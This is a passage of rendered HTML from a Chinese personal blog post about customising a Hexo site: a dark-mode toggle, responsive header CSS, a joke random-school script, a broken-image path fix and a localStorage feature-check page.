1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;moon&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: none; background: none; color: black; cursor: pointer;&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;switchColorScheme(&#x27;night&#x27;)&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;width: 25px; height: 25px;&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 24 24&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;currentColor&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M0 0h24v24H0z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在里面的图标是从<a href=\"https://remixicon.com/\">这个网站</a>复制的矢量图</p>\n<p>以及切换逻辑</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">colorScheme = <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">getItem</span>(<span class=\"string\">&#x27;color-scheme&#x27;</span>) || (<span class=\"title function_\">matchMedia</span>(<span class=\"string\">&#x27;(prefers-color-scheme: dark)&#x27;</span>).<span class=\"property\">matches</span>?<span class=\"string\">&quot;night&quot;</span>:<span class=\"string\">&quot;light&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span>(colorScheme===<span class=\"string\">&#x27;light&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">switchColorScheme</span>(<span class=\"params\">scheme</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">setItem</span>(<span class=\"string\">&quot;color-scheme&quot;</span>, scheme)</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(scheme===<span class=\"string\">&#x27;light&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> classlist = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;html&quot;</span>).<span class=\"property\">classList</span></span><br><span class=\"line\">        classlist.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;night&#x27;</span>)</span><br><span class=\"line\">        classlist.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;light&#x27;</span>)</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> classlist = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;html&quot;</span>).<span class=\"property\">classList</span></span><br><span class=\"line\">        classlist.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;night&#x27;</span>)</span><br><span class=\"line\">        classlist.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;light&#x27;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来就可以自如切换啦~</p>\n<h3 id=\"返回按钮\"><a href=\"#返回按钮\" class=\"headerlink\" title=\"返回按钮\"></a>返回按钮</h3><p><del>有一点小瑕疵，因为我加的返回按钮是通过<code>history.go(-1)</code>实现的，所以在这里切换主题后通过返回按钮返回后需要刷新才会生效，并且在通过目录跳转过的情况下这个按钮会返回上一个锚点，而不是上一个界面。</del><br>已修复，现在返回按钮通过<code>location.href = document.referrer || &#39;/&#39;</code>实现（但还是有bug，如果从一篇文章跳到另一篇，用返回键就会来回跳转，或许应该用<code>SessionStorage</code>？）</p>\n<h3 id=\"左上角的博客名称\"><a href=\"#左上角的博客名称\" class=\"headerlink\" title=\"左上角的博客名称\"></a>左上角的博客名称</h3><p>最开始是没想适配手机的，但是后面还是适配了</p>\n<p>添加没什么，主要讲讲如何适配</p>\n<p>首先，在电脑这种大地方，在左上角显示并不多余，而在手机的首页和关于页等地，有一个博客名称，故在这些页隐藏；在文章页，屏幕比较窄的话图标会和字重叠，干脆显示成一整行，中间有一个过渡态，就是刚刚穿过文字显示边界的时候，和“返回”按钮挨得特别近，不好看，就让它挨着左上角了</p>\n<p><img src=\"/GIF%202025-11-4%2020-49-48.gif\"></p>\n<p><img src=\"/GIF%202025-11-4%2020-50-19.gif\"></p>\n<p>其实对右边那个工具栏我也有修改，让它翻下去不会消失，但是页面变窄之后会和左上角的重合，就是以此分界过渡态和横条状态</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// is_post() 时</span><br><span class=\"line\"><span class=\"keyword\">@media</span> screen <span class=\"keyword\">and</span> (<span class=\"attribute\">max-width</span>: <span class=\"number\">1468px</span>) &#123; // 过渡态</span><br><span class=\"line\">    <span class=\"selector-class\">.hide-on-phone</span>&#123;</span><br><span class=\"line\">        <span class=\"attribute\">margin</span>: <span class=\"number\">0px</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-bottom-left-radius</span>: <span class=\"number\">0px</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-top-right-radius</span>: <span class=\"number\">0px</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-top</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-left</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">@media</span> screen <span class=\"keyword\">and</span> (<span class=\"attribute\">max-width</span>: <span class=\"number\">630px</span>) &#123; // 横条状态</span><br><span class=\"line\">    <span class=\"selector-class\">.hide-on-phone</span>&#123;</span><br><span class=\"line\">        <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">0</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-bottom</span>: gray <span class=\"number\">1px</span> solid <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// !is_post() 时</span><br><span class=\"line\"><span class=\"keyword\">@media</span> screen <span class=\"keyword\">and</span> (<span class=\"attribute\">max-width</span>: <span class=\"number\">1468px</span>) &#123; // 直接隐藏</span><br><span class=\"line\">    <span class=\"selector-class\">.hide-on-phone</span>&#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"随机学校\"><a href=\"#随机学校\" class=\"headerlink\" title=\"随机学校\"></a>随机学校</h3><p>这个是一个很简单的JavaScript动态界面，每次会用<code>Math.floor(Math.random()*3)</code>生成随机数<code>0</code>&#x2F;<code>1</code>&#x2F;<code>2</code>，然后用<code>document.getElementById(...).innerText = ...</code>完成动态修改</p>\n<p>并且为了<del>防止小孩误食</del>防止真的有人去报考<span style=\"text-decoration: underline wavy red;\" title=\"这是《人民日报》报道过的“野鸡大学”\" onclick=\"alert('我说没有就没有！')\">中国邮电大学</span><sup><a id=\"baikePortal\" href=\"https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/7527114\">百度百科传送门</a></sup>，更新加上了红色波浪线警示，并且将鼠标放置在其上时会显示提示（前面的这个也有），并且可以点击刷新（前面的没有），并且人性化地考虑到一顿狂点可能会被选中而影响美观，特意添加了<code>user-select: none</code>（前面那个也没有）</p>\n<style>\n    .light #baikePortal {\n        color: blue;\n    }\n    .night #baikePortal {\n        color: lightblue;\n    }\n</style>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">......目前就读于<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;studyIn&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;text-decoration: underline wavy red; cursor: pointer; user-select: none;&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;Not Truth&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span>......</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    studyIn = [<span class=\"string\">&quot;北京邮电学院&quot;</span>, <span class=\"string\">&quot;中国邮电大学&quot;</span>, <span class=\"string\">&quot;北京等通知大学&quot;</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    randomStudyIn = <span class=\"function\">()=&gt;</span>&#123;<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;studyIn&quot;</span>).<span class=\"property\">innerText</span> = studyIn[<span class=\"title class_\">Math</span>.<span class=\"title function_\">floor</span>(<span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()*<span class=\"number\">3</span>)]&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"title function_\">randomStudyIn</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;studyIn&quot;</span>).<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;click&quot;</span>, randomStudyIn)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"图裂修复\"><a href=\"#图裂修复\" class=\"headerlink\" title=\"图裂修复\"></a>图裂修复</h3><p>这个似乎是hexo的特性，网上的解决方法好像都要额外下载内容，我就不！反正图片已经被移动到正确的地方了，那我就写一个JavaScript修复就是了嘛</p>\n<p>就目前而言一切正常，可以放心食用</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 修复图炸的情况</span></span><br><span class=\"line\">(<span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>(...<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&#x27;img&#x27;</span>))).<span class=\"title function_\">forEach</span>(</span><br><span class=\"line\">    <span class=\"function\"><span class=\"params\">img</span>=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(img.<span class=\"property\">src</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>)[<span class=\"number\">3</span>]!=<span class=\"string\">&#x27;images&#x27;</span>&amp;&amp;!img.<span class=\"property\">src</span>.<span class=\"title function_\">startsWith</span>(location.<span class=\"property\">href</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;#&quot;</span>)[<span class=\"number\">0</span>]))&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`&quot;<span class=\"subst\">$&#123;<span class=\"built_in\">decodeURI</span>(img.src.split(<span class=\"string\">&#x27;/&#x27;</span>).slice(-<span class=\"number\">1</span>))&#125;</span>&quot; 貌似炸了`</span>)</span><br><span class=\"line\">            img.<span class=\"property\">src</span>=img.<span class=\"property\">src</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">slice</span>(-<span class=\"number\">1</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>前面的提示的路径也是动态生成的</p>\n<p>又小小的更新一下（2026-1-3），加了一个<code>decodeURI</code>解码<code>%xx</code>，使log更像人类（bushi</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"quote\">&gt; 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用</span></span><br><span class=\"line\"><span class=\"quote\">&gt; </span></span><br><span class=\"line\"><span class=\"quote\">&gt; 如果图炸了的话请手动拼接URL，为</span></span><br><span class=\"line\"><span class=\"quote\">&gt;</span></span><br><span class=\"line\"><span class=\"quote\">&gt; <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;urlNow&quot;</span>&gt;</span></span><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span>image-编号.png</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\">  document.getElementById(&quot;urlNow&quot;).innerText = location.href.split(&#x27;#&#x27;)[0]</span><br><span class=\"line\">  document.getElementById(&quot;urlNow&quot;).innerText += location.href.split(&#x27;#&#x27;)[0].slice(-1)===&#x27;/&#x27;?&#x27;&#x27;:&#x27;/&#x27;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>至于为什么是<code>image-编号.png</code>，是因为在VSCode的Markdown编辑器里粘贴图片的默认命名就是这个，还是要以实际为准</p>\n<h2 id=\"2026-1\"><a href=\"#2026-1\" class=\"headerlink\" title=\"2026.1\"></a>2026.1</h2><h3 id=\"back按钮\"><a href=\"#back按钮\" class=\"headerlink\" title=\"back按钮\"></a>back按钮</h3><p>突然想捣腾一下小站了，把back按钮使用sessionStorage存储，这下不至于在同一页的锚点上来回跳了，<br>但是这样的操作成功地往浏览器自己的History里面拉了一坨大的：每次点back会被认为是一次“新页面”</p>\n<p>综合考虑下，打算给自己的网页加一个FeatureConfig页</p>\n<h3 id=\"FeatureConfig页\"><a href=\"#FeatureConfig页\" class=\"headerlink\" title=\"FeatureConfig页\"></a>FeatureConfig页</h3><p>说搞就搞！</p>\n<p>首先在首页加一个Feature按钮，找到面包条在<code>_partial/header.ejs</code>里生成</p>\n<p><img src=\"/image0.png\"></p>\n<p>面包条的内容来源于theme的config，进去修改，并且__应该是翻译函数，所以为了用不到的i18n，改一下对应翻译的内容</p>\n<p><img src=\"/image.png\"></p>\n<p><img src=\"/image-1.png\"></p>\n<p><img src=\"/image-2.png\"></p>\n<p>然后<code>hexo g &amp;&amp; hexo s</code>一下看看效果</p>\n<p><img src=\"/image-3.png\"></p>\n<p><img src=\"/image-4.png\"></p>\n<p>好！接下来就是添加可选的特性了！</p>\n<p>特性依旧使用localStorage存储</p>\n<p>先来一个<code>localStorage</code>检测</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;support-storage&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;unknow&quot;</span>&gt;</span>正在检测你的浏览器是否支持localStorage……🔎<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">    <span class=\"selector-class\">.unknow</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"built_in\">hsla</span>(<span class=\"number\">54</span>, <span class=\"number\">88%</span>, <span class=\"number\">24%</span>, <span class=\"number\">1.00</span>) solid;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">color</span>: <span class=\"built_in\">hsla</span>(<span class=\"number\">54</span>, <span class=\"number\">88%</span>, <span class=\"number\">24%</span>, <span class=\"number\">1.00</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">background-color</span>: <span class=\"built_in\">hsla</span>(<span class=\"number\">54</span>, <span class=\"number\">90%</span>, <span class=\"number\">85%</span>, <span class=\"number\">1.00</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">width</span>: fit-content;</span></span><br><span class=\"line\"><span class=\"language-css\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">    <span class=\"selector-class\">.support</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#077207</span> solid;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">color</span>: <span class=\"number\">#077207</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#b4fbb4</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">width</span>: fit-content;</span></span><br><span class=\"line\"><span class=\"language-css\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">    <span class=\"selector-class\">.unsupport</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#720707</span> solid;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">color</span>: <span class=\"number\">#720707</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#fbb4b4</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">width</span>: fit-content;</span></span><br><span class=\"line\"><span class=\"language-css\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">test</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">try</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">setItem</span>(<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;ok&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">var</span> result = <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">getItem</span>(<span class=\"string\">&#x27;test&#x27;</span>) == <span class=\"string\">&#x27;ok&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">removeItem</span>(<span class=\"string\">&#x27;test&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">return</span> result;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;<span class=\"keyword\">catch</span>(error)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(error);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> result = <span class=\"title function_\">test</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">classList</span>.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;unknow&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">if</span>(result)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">innerText</span> = <span class=\"string\">&#x27;你的浏览器支持localStorage！🎉🎉🎉&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;support&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;<span class=\"keyword\">else</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">innerText</span> = <span class=\"string\">&#x27;你的浏览器好像不支持localStorage！🤔&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;unsupport&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span 